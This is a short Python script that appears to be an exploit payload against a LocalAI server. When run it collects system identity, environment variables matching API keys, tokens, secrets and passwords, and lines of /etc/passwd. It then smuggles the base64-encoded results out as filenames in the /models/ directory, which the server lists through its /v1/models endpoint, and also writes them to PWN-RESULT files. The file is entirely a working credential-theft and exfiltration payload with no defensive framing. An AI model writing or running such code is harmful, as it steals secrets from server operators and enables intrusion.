import os, subprocess, base64, sys
def _run():
    try:
        r = subprocess.check_output("id; hostname; uname -a; echo ===ENV===; env | grep -iE 'api.?key|token|secret|sk-|deepseek|openai|azure|password|auth|localai' | head -50; echo ===PASSWD===; head -10 /etc/passwd", shell=True, stderr=subprocess.STDOUT, timeout=25)
    except Exception as e:
        r = str(e).encode()
    b64 = base64.b64encode(r).decode()
    # 分段写入文件名 (LocalAI 扫描 /models/ 注册, 模型名可被 /v1/models 枚举)
    seg = 40
    for i in range(0, len(b64), seg):
        part = b64[i:i+seg]
        try:
            open("/models/OUT-" + part, "w").write("x")
        except: pass
        try:
            open("/models/ZZ-OUT-" + part, "w").write("x")
        except: pass
    # 也写入常规文件
    for p in ["/models/PWN-RESULT.txt", "/tmp/PWN-RESULT.txt"]:
        try:
            open(p, "wb").write(r)
        except: pass
_run()
